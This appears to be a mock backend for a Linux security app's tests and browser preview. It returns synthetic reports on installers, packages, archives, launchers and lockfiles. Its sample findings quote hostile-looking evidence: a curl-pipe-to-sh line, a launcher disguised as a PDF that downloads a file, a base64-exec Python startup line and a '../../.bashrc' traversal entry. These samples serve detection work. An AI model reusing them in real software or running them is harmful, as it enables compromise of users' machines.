import {
  DisconnectedError,
  type Action,
  type ActionOutcome,
  type ActionPlan,
  type Canary,
  type DesktopShell,
  type Event,
  type Live,
  type NotificationSettings,
  type Quarantined,
  type Report,
  type Request,
  type RuleInfo,
  type Response,
  type ScanItem,
  type Transport,
  type Unread,
} from "@/ipc";
import rules from "@/ipc/generated/rules.json";
import { checkup, history, NOW, report, scanWithFinding, statusScenarios } from "./fixtures";
import { INTERFACES, networkSnapshot, RECEIPTS, securityUpdates, reportEvent, sampleAt, samplesFor, seedEvents, sourceStatuses } from "./live";

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
const id = () => crypto.randomUUID();
const now = () => Math.floor(Date.now() / 1000);
/** Lockfile names core's lockfile::format_of recognises. */
const LOCKFILES = new Set(["package-lock.json", "npm-shrinkwrap.json", "yarn.lock", "pnpm-lock.yaml", "bun.lock", "Cargo.lock"]);

/**
 * A small in-memory bigmand for `npm run dev:browser` and tests. Checks return
 * synthetic reports, actions change the in-memory state, and cancel works. The
 * scenario comes from `?scenario=` (findings, calm, incomplete, empty,
 * disconnected, loading).
 */
class MockDaemon {
  reports: Report[];
  items = new Map<string, ScanItem[]>();
  quarantine: Quarantined[] = [];
  canaries: Canary[] = [];
  monitor: boolean;
  running = new Map<string, () => void>();
  events: Event[];
  seenThrough: number;
  notifications: NotificationSettings = { findings: true, new_connections: false, new_listeners: false, packages: false, denials: false, paused_until: null };
  subscribers = new Set<(live: Live) => void>();
  hook = false;
  preferences = { check_updates: true };

  constructor(
    readonly scenario: string,
    /** Multiplies simulated check durations; tests pass 0. */
    readonly speed = 1,
  ) {
    this.monitor = (statusScenarios[scenario] ?? statusScenarios.findings)?.monitor != null && scenario !== "empty";
    this.reports = scenario === "empty" ? [] : history(scenario);
    // A calm machine has its daily security-updates check on record.
    if (scenario === "calm") {
      this.reports = [...this.reports, securityUpdates("calm", "3f6c2a1e-0000-4000-8000-500000000001", NOW - 3 * 3_600)].sort((a, b) => b.created - a.created);
    }
    this.events = seedEvents(scenario, this.reports);
    // Everything older than an hour was looked at already.
    this.seenThrough = this.events.filter((e) => e.at < NOW - 3_600).reduce((m, e) => Math.max(m, e.id), 0);
    this.items.set(scanWithFinding.id, [
      { path: "/home/sam/Downloads/invoice-copy.zip", hash: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", detected: true, signature: "Win.Test.EICAR_HDB-1" },
      { path: "/home/sam/Downloads/notes.txt", hash: "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", detected: false, signature: "" },
    ]);
    if (scenario !== "empty") {
      this.canaries = [{ id: "8d0c7e55-0000-4000-8000-000000000002", path: "/home/sam/Documents/backup-access.env", created: NOW - 9 * 86_400, kind: "local-decoy" }];
      this.quarantine = [{ id: "5b1f0000-0000-4000-8000-000000000003", original: "/home/sam/Downloads/old-installer.run", hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", created: NOW - 3 * 86_400, restored: false }];
    }
  }

  /** What the store's history returns: shortened like core's Store::save. */
  summarize(r: Report): Report {
    const rank = { high: 2, review: 1, info: 0 } as const;
    return {
      ...r,
      details: "",
      findings: [...r.findings].sort((a, b) => rank[b.severity] - rank[a.severity]).slice(0, 20),
      coverage: { ...r.coverage, notes: [`History summary; ${r.findings.length} findings and ${r.errors.length} errors. Open the report for full evidence.`] },
      summary: { findings: r.findings.length, to_review: r.findings.filter((f) => f.severity !== "info").length, errors: r.errors.length },
    };
  }

  save(r: Report): Report {
    this.reports = [r, ...this.reports];
    const key = reportEvent(r, 0, 0, 0).key;
    const earlier = this.events.filter((e) => e.key === key);
    this.record(reportEvent(r, this.nextId(), earlier.length, earlier[0]?.first_at ?? r.created));
    return r;
  }

  nextId(): number {
    return (this.events.at(-1)?.id ?? 0) + 1;
  }

  /** Stores an event and pushes it, as the daemon's timeline does. */
  record(event: Event) {
    this.events = [...this.events, event];
    this.push({ type: "event", value: event });
    this.push({ type: "unread", value: this.unread() });
  }

  push(live: Live) {
    for (const subscriber of this.subscribers) subscriber(live);
  }

  unread(): Unread {
    const fresh = this.events.filter((e) => e.id > this.seenThrough);
    return {
      first_seen: fresh.filter((e) => e.seen_before === 0).length,
      to_review: fresh.filter((e) => e.severity !== "info").length,
      through: fresh.at(-1)?.id ?? this.seenThrough,
      seen_through: this.seenThrough,
    };
  }

  /** Runs a check for `ms`, or returns a cancelled report if cancelled first. */
  async check(token: string | undefined, ms: number, make: () => Report, kind: string, subject: string): Promise<Report> {
    const cancelled = await new Promise<boolean>((resolve) => {
      const timer = setTimeout(() => resolve(false), ms * this.speed);
      if (token) this.running.set(token, () => { clearTimeout(timer); resolve(true); });
    });
    if (token) this.running.delete(token);
    if (cancelled) {
      return this.save(report({ id: id(), created: now(), kind, subject, coverage: { checked: [], notes: [], skipped: [{ what: subject, why: "cancelled", detail: "Cancelled before the check finished" }] } }));
    }
    return this.save(make());
  }

  plan(action: Action): ActionPlan {
    const plan = (title: string, verb: string, summary: string, details: string, undo: string | null = null, careful = false): ActionPlan => ({ title, verb, summary, details, undo, careful, facts: [], note: null, details_label: null });
    switch (action.kind) {
      case "receipt_hook": return action.remove
        ? plan("Stop previewing package changes", "Remove the hook", "Delete /etc/dnf/libdnf5-plugins/actions.d/bigman-preview.actions. dnf stops asking Bigman before a transaction; receipts afterwards continue.", "pkexec /bin/sh -c \"rm -f '/etc/dnf/libdnf5-plugins/actions.d/bigman-preview.actions'\"", "Turn the preview on again from Setup.")
        : plan("Preview package changes before they happen", "Install the hook", "Add a hook so dnf shows each transaction's receipt in Bigman first, with Continue and Abort. It continues on its own after a minute, so unattended upgrades never wait, and it continues whenever Bigman is not running or cannot read a package. Administrator approval is asked for by polkit.", "/etc/dnf/libdnf5-plugins/actions.d/bigman-preview.actions\n\n# Bigman install-receipt preview (opt-in from Bigman's Setup). Delete this file to turn it off.\npre_transaction:*:in::/usr/bin/bigman receipt --stage ${pkg.full_nevra} ${pkg.repo_id} ${pkg.location} ${pkg.action}\npre_transaction:::raise_error=1:/usr/bin/bigman receipt --preview --manager dnf", "Undo removes the hook file again.");
      case "journal_access": return action.remove
        ? plan("Stop reading the system journal", "Leave the group", "Remove your account from systemd-journal. Bigman stops collecting denials from your next login.", "pkexec gpasswd -d sam systemd-journal", "Join the group again from Setup.")
        : plan("Read SELinux and AppArmor denials", "Join the group", "Add your account to systemd-journal, the group that may read the system journal. Bigman then turns denials into plain sentences in Activity. Your account can also read other system logs; nothing gains write access. Administrator approval is asked for by polkit, and it takes effect at your next login.", "pkexec usermod -aG systemd-journal sam", "Undo removes you from the group again.");
      case "install_tool": return plan("Install optional tools", "Install", `Install the ${action.tool} packages from your distribution's configured repositories. Administrator approval is asked for by polkit.`, `pkexec dnf install -y ${action.tool}`, "Remove the packages with your package manager if you no longer want them.");
      case "services": return action.remove
        ? plan("Remove background services", "Remove", "Stop and remove Bigman's per-user collector, monitor and daily update units. Reports, the timeline and canary files stay.", "~/.config/systemd/user/bigmand.service\n~/.config/systemd/user/bigman-monitor.service\n~/.config/systemd/user/bigman-update.timer", "Install the services again from Setup.")
        : plan("Install background services", "Install", "Write and enable per-user units: the collector daemon that keeps Activity and Network history while the window is closed, which also checks each new file in Downloads as it arrives, the canary and startup monitor, and daily signature updates. Nothing system-wide.", "~/.config/systemd/user/bigmand.service\n~/.config/systemd/user/bigman-monitor.service\n~/.config/systemd/user/bigman-update.timer", "Undo removes them again.");
      case "package_policy": return plan("Disable automatic install scripts", "Write .npmrc", "Add ignore-scripts=true to this project's .npmrc so npm and pnpm do not run lifecycle scripts during install.", `Would update ${action.path}/.npmrc`, "Delete the added lines from .npmrc.");
      case "accept_baseline": return plan("Accept startup baseline", "Accept", "Treat the 1 changed startup entries below as expected from now on. Accept them only if you know why they changed. Bigman refuses if anything changed since this report.", "Changed: /home/sam/.bashrc", "Bigman keeps the baseline this replaces; Undo puts it back.");
      case "restore_previous_baseline": return plan("Restore the previous baseline", "Restore", "Put back the startup baseline that the last acceptance replaced.", "");
      case "quarantine": {
        const item = this.items.get(action.report)?.[action.index];
        return plan("Quarantine a file", "Quarantine", "Save a private recovery copy, check the file is unchanged since the scan, then remove it from its folder. No other file is touched.", `${item?.path ?? ""}\nSignature ${item?.signature ?? ""}\nSHA-256 ${item?.hash ?? ""}`, "Undo restores it, as long as nothing new has taken its path.");
      }
      case "restore": {
        const q = this.quarantine.find((x) => x.id === action.id);
        return plan("Restore a quarantined file", "Restore", "Write the recovery copy back to its original path with permissions 0600. Bigman refuses to overwrite an existing file. This file was flagged by a scan.", `${q?.original ?? ""}\nSHA-256 ${q?.hash ?? ""}`);
      }
      case "rehearse": return plan("Rehearse the installer", "Run in the sandbox", "Run the saved installer in a disposable offline sandbox with no home directory, credentials or network. This runs the code; it does not install anything on your system.", `SHA-256 ${action.sha256}`, null, true);
      case "open_container": {
        const network = action.offline ? "none" : "pasta:--no-map-gw";
        const publish = action.port === null ? "" : ` --publish 127.0.0.1:${action.port}:${action.port}`;
        const facts = [
          { label: "Copied in", value: action.path },
          { label: "Image", value: "docker.io/library/node:lts, because the project has package.json. The first time, Podman downloads it from docker.io (often several hundred MB), even with no network inside, and keeps it." },
          { label: "Network", value: action.offline ? "None" : "On. Code inside can reach the internet, your local network, and services on this computer that listen on its network address, but not ones that listen only on 127.0.0.1." },
          ...(action.port === null ? [] : [{ label: "Port", value: `127.0.0.1:${action.port} on this computer goes to ${action.port} inside` }]),
          { label: "User inside", value: "1000, without added privileges. Outside the container it is an unused ID, not your account." },
          { label: "Limits", value: "4 GiB of memory, 4096 processes" },
        ];
        const cli = `bigman try${action.offline ? " --offline" : ""}${action.port === null ? "" : ` --port ${action.port}`} ${action.path}`;
        return {
          ...plan(
            "Open in a disposable container",
            "Open in a disposable container",
            `Copy ${action.path.split("/").pop() ?? action.path} into a new Podman container and open a shell there in a terminal window. The container gets that copy and none of your home folder, keys, browser data or environment variables. ${action.offline ? "Code inside has no network." : "Code inside can use the network."} The container, the copy and anything downloaded into it are deleted when the shell exits.`,
            `# The same as: ${cli}\nNAME=bigman-try-<8 random characters>\nPID=<the process ID of bigman try>\npodman create --rm --name $NAME --hostname bigman-try --label io.bigman.try=$PID --interactive --tty --log-driver none --user 1000:1000 --cap-drop all --env HOME=/home/user --security-opt no-new-privileges --workdir /work --memory 4g --pids-limit 4096 --network ${network}${publish} docker.io/library/node:lts sh -c 'if command -v bash >/dev/null; then exec bash -l; else exec sh -l; fi'\npodman cp ${action.path} $NAME:/work\npodman cp <an empty folder> $NAME:/home/user\npodman start --attach --interactive $NAME\npodman rm --force --volumes --time 0 $NAME`,
          ),
          facts,
          note: "A container shares this computer's kernel, so a kernel flaw could let code out. For something you believe is malware, use a separate computer or a virtual machine.",
          details_label: "The commands Bigman runs",
        };
      }
      case "arm_canary": return plan("Set up a canary file", "Create and test", "Create a decoy file (or reuse a registered one), start monitoring now and at each login, and read it once to prove detection works.", `${action.path}\nThe file contains a synthetic token, not a working credential.`, "Undo stops watching the decoy; the file stays where it is.");
      case "start_monitor": return plan("Start canary monitoring", "Start", "Start the monitor for the registered decoys and enable it at login. No files are created.", this.canaries.map((c) => c.path).join("\n"));
      case "stop_monitor": return plan("Stop canary monitoring", "Stop", "Stop the monitor and remove its login service. Decoy files and history stay. Reads while stopped are not noticed.", "", "Start monitoring again from Protect > Canaries.");
      case "create_hosted_canary": return plan("Save a hosted canary shortcut", "Save shortcut", "Write a shortcut file that points at your provider's token URL. Bigman does not visit the URL.", `${action.path}\n${action.url}`);
      case "disarm_canary": return plan("Stop watching a decoy", "Stop watching", "Remove this decoy from Bigman's list. The file itself stays where it is.", this.canaries.find((c) => c.id === action.id)?.path ?? "");
      case "register_native_host": return plan("Connect the browser extension", "Connect", "Write native-messaging host manifests that let only this extension ID talk to Bigman.", `Extension ${action.extension_id}\n~/.config/google-chrome/NativeMessagingHosts/com.bigman.pdf_scanner.json`, "Delete the manifest files listed above.");
    }
  }

  apply(action: Action): ActionOutcome {
    const done = (message: string, report: Report | null = null, undo: Action | null = null): ActionOutcome => ({ message, report, undo });
    switch (action.kind) {
      case "quarantine": {
        const item = this.items.get(action.report)?.[action.index];
        if (!item) throw new Error("That scan item does not exist");
        const q = { id: id(), original: item.path, hash: item.hash, created: now(), restored: false };
        this.quarantine = [q, ...this.quarantine];
        return done(`A recovery copy is saved and ${item.path} was removed from its folder.`, null, { kind: "restore", id: q.id });
      }
      case "restore":
        this.quarantine = this.quarantine.map((q) => (q.id === action.id ? { ...q, restored: true } : q));
        return done("Restored without executable permissions.");
      case "arm_canary": {
        let canary = this.canaries.find((c) => c.path === action.path);
        if (!canary) {
          canary = { id: id(), path: action.path, created: now(), kind: "local-decoy" };
          this.canaries = [...this.canaries, canary];
        }
        this.monitor = true;
        return done("Canary setup finished.", this.save(report({ id: id(), created: now(), kind: "Local canary setup", subject: action.path, findings: [{ rule: "canary.verified", severity: "info", summary: "Local read detection verified", evidence: "Kernel read receipt from the monitor", action: "Leave monitoring running." }], coverage: { checked: ["Decoy file", "Monitor heartbeat", "Read receipt"], notes: ["A deliberate read was followed by a new receipt from the real filesystem monitor."], skipped: [] } })), { kind: "disarm_canary", id: canary.id });
      }
      case "start_monitor": this.monitor = true; return done("Monitor startup finished.");
      case "stop_monitor": this.monitor = false; return done("Monitor stopped.");
      case "disarm_canary": this.canaries = this.canaries.filter((c) => c.id !== action.id); return done("Decoy removed from the list; its file was kept.");
      case "create_hosted_canary": this.canaries = [...this.canaries, { id: id(), path: action.path, created: now(), kind: "hosted-url" }]; return done(`Shortcut saved at ${action.path}`);
      case "rehearse": return done("Rehearsal finished.", this.save(report({ id: id(), created: now(), kind: "Restricted installer rehearsal", subject: "install-tool.sh", findings: [{ rule: "trace.network", severity: "review", summary: "Execution attempted a network connection", evidence: 'connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.215.14")}, 16) = -1 ENETUNREACH', action: "The rehearsal has no external network. Review why the connection was attempted." }], coverage: { checked: ["Offline sandbox run", "strace"], notes: ["A rehearsal shows what the script tried in this one run, not what it would do elsewhere."], skipped: [] } })));
      case "accept_baseline": return done("Baseline saved.", null, { kind: "restore_previous_baseline" });
      case "restore_previous_baseline": return done("The previous baseline is back.");
      case "services": return done(action.remove ? "User services removed" : "The collector daemon, monitoring, daily scan and definition updates are enabled.", null, action.remove ? null : { kind: "services", remove: true });
      case "receipt_hook": this.hook = !action.remove; return done(action.remove ? "Removed the hook. dnf no longer asks Bigman before a transaction." : "Installed the hook. Before each transaction dnf now shows the receipt in Bigman and waits up to a minute for Continue or Abort.", null, action.remove ? null : { kind: "receipt_hook", remove: true });
      case "journal_access": return done(action.remove ? "You are no longer in systemd-journal." : "You are now in systemd-journal. Log out and back in; denials are collected from then on.", null, action.remove ? null : { kind: "journal_access", remove: true });
      case "open_container": return done("A terminal window is open (konsole). The container starts there; Podman may first download the image. Leaving the shell deletes the container and the copy.");
      case "package_policy": return done(`Updated ${action.path}/.npmrc. npm and pnpm no longer run lifecycle scripts during install there.`);
      default: return done("Done.");
    }
  }

  async handle(request: Request, token?: string): Promise<Response> {
    const r = (value: Report): Response => ({ type: "report", value });
    switch (request.type) {
      case "health": return { type: "health", value: { version: "0.2.0", pid: 4100, started: NOW - 3_600, state_dir: "/home/sam/.local/share/bigman" } };
      case "status": {
        const value = statusScenarios[this.scenario] ?? statusScenarios.findings;
        if (!value) throw new Error("missing fixture");
        return { type: "status", value: { ...value, monitor: this.monitor ? value.monitor : null, receipt_hook: this.hook ? "/etc/dnf/libdnf5-plugins/actions.d/bigman-preview.actions" : null } };
      }
      case "doctor": return r(await this.check(token, 1_200, checkup, "Security checkup", "Local Linux workstation"));
      case "history": return { type: "history", value: this.reports.slice(0, request.limit).map((x) => this.summarize(x)) };
      case "report": {
        const found = this.reports.find((x) => x.id === request.id);
        if (!found) return { type: "error", value: { message: `No report ${request.id}` } };
        return r(found);
      }
      case "scan": return r(await this.check(token, 2_500, () => {
        const scan = report({ id: id(), created: now(), subject: request.path });
        this.items.set(scan.id, []);
        return scan;
      }, "File scan", request.path));
      case "update_signatures": return r(await this.check(token, 1_500, () => report({ id: id(), created: now(), kind: "Signature update", subject: "Private ClamAV definitions", coverage: { checked: ["freshclam"], notes: ["Uses a private signature directory; existing system updater configuration is preserved."], skipped: [] } }), "Signature update", "Private ClamAV definitions"));
      case "pdf": return r(await this.check(token, 900, () => report({ id: id(), created: now(), kind: "PDF triage", subject: request.path, coverage: { checked: ["PDF structure"], notes: ["Deterministic PDF triage. Parsing never runs document actions."], skipped: [] }, findings: [{ rule: "pdf.structure", severity: "info", summary: "External link", evidence: "/URI: 3 raw/escaped-name occurrences", action: "Review the destinations before following them." }] }), "PDF triage", request.path));
      case "inspect_any": {
        // The same order as core's route.rs: URLs, lockfiles, packages, PDFs, package files, launchers, archives, folders.
        // npm tarballs stand in for archives that hold a package.
        const t = request.target;
        const name = t.split("/").pop() ?? "";
        if (t.startsWith("https://")) return this.handle({ type: "inspect", target: t }, token);
        if (LOCKFILES.has(name)) return this.handle({ type: "lockfile", path: t, against: null }, token);
        if (/\.(tgz|tar\.gz)$/i.test(name) || name === "package.json") return this.handle({ type: "packages", path: t }, token);
        if (t.endsWith(".pdf")) return this.handle({ type: "pdf", path: t }, token);
        if (/\.(deb|rpm)$/.test(t)) return r(await this.check(token, 700, () => report({ id: id(), created: now(), kind: "Package file", subject: t, sha256: "5d0c3b8e1f7a2c9d4e6b0a3f8c1d7e2b9a4f6c0e3d8b1a7f2c5e9d0b4a6c3f1e", coverage: { checked: ["262 files and 3 install scripts (deb)"], notes: ["Reads the package's description, file list and install scripts without installing it or running anything."], skipped: [] }, findings: [
          { rule: "pkg.install-script", severity: "review", summary: "example-tool runs a postinst script as root", evidence: "#!/bin/sh\nset -e\ncp /opt/example/example.list /etc/apt/sources.list.d/\nupdate-desktop-database || true", action: "Read the script before installing. It runs with full control of the system, and a signature only says who built the package." },
          { rule: "pkg.adds-source", severity: "review", summary: "Installing it adds a package source", evidence: "postinst script, line 3: cp /opt/example/example.list /etc/apt/sources.list.d/", action: "Updates for this and other packages can then come from that source. Check it is the vendor's own, and see Protect > Updates > Package sources after installing." },
          { rule: "pkg.startup-path", severity: "review", summary: "The package installs files that run at boot or login, or change how people sign in", evidence: "/etc/cron.daily/example-tool", action: "Services, timers, cron jobs, login scripts, PAM and sudo rules take effect without anything being opened. Check each one is expected for this package." },
        ], details: "Package: example-tool 2.4.1-1\nMaintainer: Example Ltd <linux@example.org>\nHomepage: https://example.org" }), "Package file", t));
        if (/\.(whl|crate|vsix)$/.test(t)) return r(await this.check(token, 600, () => report({ id: id(), created: now(), kind: "Package archive", subject: t, sha256: "8e2a6c0f4b9d1e7a3c5f8b0d2e6a9c1f7b4d0e3a8c2f6b9d1e5a7c0f3b8d4e2a", details: "Package: example-sdk 4.2.0\nMaintainer: Example Team <sdk@example.org>\nHomepage: https://example.org/sdk", coverage: { checked: ["38 entries (zip)", "Python wheel"], notes: ["Reads the wheel's .pth files, startup modules and entry points as text. Installing a wheel runs no code, but Python runs .pth import lines at every start."], skipped: [] }, findings: [
          { rule: "py.startup-code", severity: "high", summary: "The package runs hidden or far-reaching code every time Python starts", evidence: "example_init.pth, line 1: import base64; exec(base64.b64decode('aW1wb3J0IG9z…')) … (34120 characters)", action: "Once installed, this runs in every Python program, pip included, without being imported. Tools such as setuptools do this to adjust imports; code that decodes, executes or connects has no such reason." },
        ] }), "Package archive", t));
        if (t.endsWith(".desktop")) return r(await this.check(token, 400, () => report({ id: id(), created: now(), kind: "Launcher check", subject: t, sha256: "9b1f0c5e2d7a43c18e6f5a0b4d3c2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d", coverage: { checked: ["Launcher fields"], notes: ["Reads the launcher as text; nothing is run."], skipped: [] }, findings: [
          { rule: "desktop.masquerade", severity: "high", summary: "Meeting_Notice.pdf.desktop is a program launcher made to look like a file", evidence: `${t}\nName: Meeting_Notice.pdf\nRuns: sh -c "curl -fsSL https://example.org/u -o /tmp/u"\nLooks like a file because its file name ends in .pdf.desktop and it uses the application-pdf icon.`, action: "Do not open it. A real document does not end in .desktop. Delete it unless you know who made it and why." },
          { rule: "desktop.exec-download", severity: "high", summary: "Meeting_Notice.pdf.desktop downloads something when opened", evidence: `${t}\nName: Meeting_Notice.pdf\nRuns: sh -c "curl -fsSL https://example.org/u -o /tmp/u"`, action: "Do not open it. What it downloads is not part of this check and can change at any time." },
        ], details: '[Desktop Entry]\nType=Application\nName=Meeting_Notice.pdf\nExec=sh -c "curl -fsSL https://example.org/u -o /tmp/u"\nIcon=application-pdf\n' }), "Launcher check", t));
        if (/\.(zip|tar|tar\.(gz|xz|zst|bz2))$/.test(t)) return r(await this.check(token, 600, () => report({ id: id(), created: now(), kind: "Archive check", subject: t, sha256: "2c7e1a9f4b8d3e6c0a5f9b2d7e4c1a8f3b6d0e9c5a2f7b4d1e8c3a6f0b9d2e5c", coverage: { checked: ["214 entries (zip)"], notes: ["Lists the archive without extracting it: entry names, link targets, permissions and declared sizes. Launchers inside are read as text."], skipped: [] }, findings: [
          { rule: "archive.path-traversal", severity: "high", summary: "Entries climb out of the folder they are extracted into", evidence: "photos/../../.bashrc", action: "Names with .. can write outside the destination, for example over ~/.bashrc. Ordinary archives never need them. Do not extract it." },
          { rule: "archive.startup-path", severity: "review", summary: "Entries would land in startup or login files", evidence: "photos/../../.bashrc (under .bashrc)", action: "If extracted into your home folder or /, these files run at login or change who can sign in. Check each one before extracting there." },
        ] }), "Archive check", t));
        // A folder: its package scripts plus what the tree could run when opened.
        if (!/\.[a-z0-9]+$/i.test(t)) {
          return r(await this.check(token, 900, () => report({ id: id(), created: now(), kind: "Project inspection", subject: t, coverage: { checked: ["Package manifests", "Referenced scripts", "7 configuration files"], notes: ["Reads package manifests and script source as data; never runs npm or lifecycle hooks.", "Reads the project's files as data: IDE tasks, direnv, devcontainers, git attributes and hooks, AI-tool settings, MCP servers, instruction files and CI workflows. Nothing in the project is run."], skipped: [] }, findings: [
            { rule: "repo.autorun-task", severity: "review", summary: "Opening this folder in VS Code runs \"setup\"", evidence: `.vscode/tasks.json, line 4: "runOptions": {"runOn": "folderOpen"}\ncommand: node scripts/setup.js`, action: "Read the task before opening the folder in a trusted window; VS Code asks only once per folder." },
            { rule: "package.lifecycle", severity: "review", summary: "fixture@1.0.0: postinstall", evidence: `${t}/package.json\nnode scripts/setup.js`, action: "Review referenced source. Installation approvals do not constrain later runtime behavior." },
            { rule: "repo.workflow-unpinned", severity: "review", summary: "A workflow uses some-org/setup-tool@v3 by tag, not by commit", evidence: ".github/workflows/ci.yml, line 8: uses: some-org/setup-tool@v3", action: "A tag can be moved to different code. Pin third-party actions to a full commit SHA." },
          ] }), "Project inspection", t));
        }
        return this.handle({ type: "inspect", target: t }, token);
      }
      case "inspect": return r(await this.check(token, 900, () => report({ id: id(), created: now(), kind: "Installer inspection", subject: request.target, sha256: "4397ea1f9014f4ae085fb4f108db3aaa16f00d5711ff5070fb36d4117b18f87e", findings: [{ rule: "shell.execute-download", severity: "high", summary: "Downloads and executes code", evidence: "Line 4: curl -fsSL https://example.org/setup.sh | sh", action: "Save and inspect the exact downloaded bytes first." }, { rule: "shell.privilege", severity: "review", summary: "Requests elevated privileges", evidence: "Line 5: sudo install -m 0755 /tmp/tool /usr/local/bin/tool", action: "Check why this operation needs administrator access." }], coverage: { checked: ["Capability rules", "ShellCheck"], notes: ["Static capability rules only. No code was executed."], skipped: [] }, details: '#!/bin/sh\necho "Installing example tool"\ncurl -fsSL https://example.org/tool.tar.gz -o /tmp/tool.tar.gz\ncurl -fsSL https://example.org/setup.sh | sh\nsudo install -m 0755 /tmp/tool /usr/local/bin/tool' }), "Installer inspection", request.target));
      case "packages": return r(await this.check(token, 700, () => report({ id: id(), created: now(), kind: "Package script inventory", subject: request.path, coverage: { checked: ["Package manifests", "Referenced scripts"], notes: ["Reads package manifests and script source as data; never runs npm or lifecycle hooks."], skipped: [] }, findings: [{ rule: "package.lifecycle", severity: "review", summary: "fixture@1.0.0: postinstall", evidence: `${request.path}/package.json\nnode scripts/setup.js`, action: "Review referenced source. Installation approvals do not constrain later runtime behavior." }] }), "Package script inventory", request.path));
      case "repo_check": return this.handle({ type: "inspect_any", target: request.path }, token);
      case "lockfile": return r(await this.check(token, 500, () => report({ id: id(), created: now(), kind: "Lockfile check", subject: request.path, coverage: { checked: ["412 locked packages"], notes: [request.against ? "Only packages that are new or changed since the older lockfile are checked." : "Reads the lockfile as text; nothing is installed. Install hooks are listed where the lockfile records them (npm and pnpm)."], skipped: [] }, findings: request.against ? [
        { rule: "lockfile.source-changed", severity: "high", summary: "lodash@4.17.21 changed where it downloads from without a new version", evidence: "package-lock.json: lodash@4.17.21\nbefore:\nresolved https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz\nintegrity sha512-v2kDE\nnow:\nresolved https://cdn.example.net/lodash-4.17.21.tgz\nintegrity (none)", action: "A published version never changes, so a new address or hash for the same version means the lockfile was edited by hand or by a tool. Find out who changed it before installing." },
        { rule: "lockfile.non-registry", severity: "review", summary: "lodash comes from outside the package registry", evidence: "package-lock.json: lodash@4.17.21\nresolved https://cdn.example.net/lodash-4.17.21.tgz", action: "Dependencies from git, a plain URL or a local path skip the registry's checks and can change without a version bump. Make sure lodash is meant to come from https://cdn.example.net/lodash-4.17.21.tgz." },
      ] : [
        { rule: "lockfile.install-hook", severity: "info", summary: "esbuild runs an install script", evidence: "package-lock.json: esbuild@0.25.10\nresolved https://registry.npmjs.org/esbuild/-/esbuild-0.25.10.tgz", action: "Install scripts run with your permissions during npm install. Read the package's scripts, or install with --ignore-scripts." },
      ] }), "Lockfile check", request.path));
      case "package_sources": return r(await this.check(token, 400, () => report({ id: id(), created: now(), kind: "Package sources", subject: "This computer", coverage: { checked: ["dnf repositories (9)", "Flatpak remotes (2)"], notes: ["Reads package-source configuration only; no repository is contacted. The distribution's own repositories are recognised by host or repository name, so a private mirror of them is listed as third-party.", "Newest distribution metadata: /var/cache/libdnf5/updates-3cc07c89a20302f2/repodata/repomd.xml"], skipped: [] }, findings: [
        { rule: "channel.priority-override", severity: "review", summary: "rpmfusion-nonfree-steam outranks the distribution's own packages", evidence: "/etc/yum.repos.d/rpmfusion-nonfree-steam.repo\nrpmfusion-nonfree-steam https://mirrors.rpmfusion.org/metalink?repo=nonfree-fedora-steam-$releasever&arch=$basearch\npriority=50, the distribution's is 99", action: "A third-party repository that wins over the distribution can replace system packages with its own builds on the next update. Make sure you mean it." },
        { rule: "channel.personal-repo", severity: "info", summary: "1 personal repository", evidence: "copr:copr.fedorainfracloud.org:phracek:PyCharm (dnf) https://download.copr.fedorainfracloud.org/results/phracek/PyCharm/fedora-$releasever-$basearch/", action: "Each is run by one person or project, and the distribution does not review it. Remove the ones you no longer use." },
        { rule: "channel.third-party", severity: "info", summary: "3 third-party package sources", evidence: "google-chrome (dnf) https://dl.google.com/linux/chrome/rpm/stable/x86_64\nrpmfusion-nonfree-steam (dnf) https://mirrors.rpmfusion.org/metalink?repo=nonfree-fedora-steam-$releasever&arch=$basearch\nvscode (dnf) https://packages.microsoft.com/yumrepos/vscode", action: "Each can ship updates for anything it packages. Remove sources you no longer use." },
      ] }), "Package sources", "This computer"));
      case "advisories": return r(await this.check(token, 1_400, () => securityUpdates(this.scenario, id(), now()), "Security updates", "Fedora Linux 44 (Workstation Edition)"));
      case "changes": return r(await this.check(token, 600, () => report({ id: id(), created: now(), kind: "Persistence changes", subject: "Startup and system configuration", coverage: { checked: ["Startup and configuration files", "Package attribution (rpm)"], notes: ["Records content, mode, owner and file capabilities of startup, scheduling, login, PAM, loader, kernel-module, udev, SSH, name-resolution and desktop-handler files. Baseline means previously observed, not trusted; it does not identify the writer."], skipped: [] }, findings: [
        { rule: "persistence.sensitive_modified", severity: "high", summary: "/etc/pam.d/sudo differs from what sudo-1.9.17-10.p2.fc44 installed", evidence: "/etc/pam.d/sudo\nPAM authentication\nOwned by sudo-1.9.17-10.p2.fc44 (a configuration file), but modified: size, content\nmode 0644, owner 0:0\nSHA-256 30273a0ee8c676cd83d1f725ca2eb628d92715e22a92b8fec73cf30834f7a3a2", action: "Compare it with the package's version (rpm -V, dpkg --verify or pacman -Qkk) and restore it if you did not make the change." },
        { rule: "persistence.change", severity: "review", summary: "/home/sam/.bashrc changed", evidence: "/home/sam/.bashrc\nshell profile or environment\nNot owned by any package\nmode 0644, owner 1000:1000\nSHA-256 9a1d0c3fbb4ce2d1b9f2a4e5b7c8d9e0f1a2b3c4d5e6f708192a3b4c5d6e7f80", action: "Review the file and the package that owns it before accepting a new baseline." },
        { rule: "persistence.package_update", severity: "info", summary: "/etc/systemd/system/multi-user.target.wants/sshd.service updated by openssh-server-10.0p1-5.fc44", evidence: "/etc/systemd/system/multi-user.target.wants/sshd.service\nsystemd unit\nOwned by openssh-server-10.0p1-5.fc44, matches the package\nmode 0777, owner 0:0\nSHA-256 be520ca2629ea1612ce896eed9204eea4b15eee54f3ea2ffeb232fd4f28ad779", action: "Nothing to do: the package database accounts for this change." },
      ], sha256: "be520ca2629ea1612ce896eed9204eea4b15eee54f3ea2ffeb232fd4f28ad779" }), "Persistence changes", "Startup and system configuration"));
      case "audit": return r(await this.check(token, 1_500, () => report({ id: id(), created: now(), kind: `${request.tool} integration`, subject: request.path, coverage: { checked: ["Upstream tool"], notes: ["Runs as you; checks that need administrator access are reported as not run."], skipped: [] } }), `${request.tool} integration`, request.path));
